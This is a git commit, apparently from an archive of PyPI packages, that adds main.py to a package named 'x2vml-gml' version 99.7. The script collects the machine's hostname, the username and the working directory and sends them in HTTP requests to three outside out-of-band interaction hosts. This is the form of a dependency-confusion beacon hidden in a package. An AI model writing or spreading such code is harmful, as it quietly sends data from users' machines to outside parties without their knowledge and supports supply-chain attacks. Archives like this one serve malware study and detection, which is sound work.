98a4c86da9f11dfb819a01e8b96d97fd95c1d163
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-11-05 16:05:14 +0000

    Add package x2vml-gml/99.7/x2vml_gml-99.7.tar.gz

---
+++ packages/x2vml-gml/x2vml_gml-99.7.tar.gz/x2vml_gml-99.7/main.py
@@ -0,0 +1,35 @@
+import platform
+import getpass
+import os
+import urllib
+import logging
+import random
+
+def main():
+    hostname = platform.node()
+    username = getpass.getuser()
+    current_path = os.getcwd()
+    rd_num = random.randint(10000, 99999)
+    urls = [
+        "http://dnipqouebm-psl.cn.oast-cn.byted-dast.com001",
+        "http://oqvignkp58-psl.i18n.oast-row.byted-dast.com/realtime_p/pypi/001",
+        "http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun"
+    ]
+
+    for url in urls:
+        params = {
+            "packagename": "x2vml-gml",
+            "hostname": hostname,
+            "user": username,
+            "path": current_path
+        }
+        full_url = f"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}"
+        try:
+            with urllib.request.urlopen(full_url) as response:
+                logging.info(response.read().decode())
+        except Exception as e:
+            logging.error(f"Could not reach {url}: {e}")
+
+
+if __name__ == "__main__":
+    main()
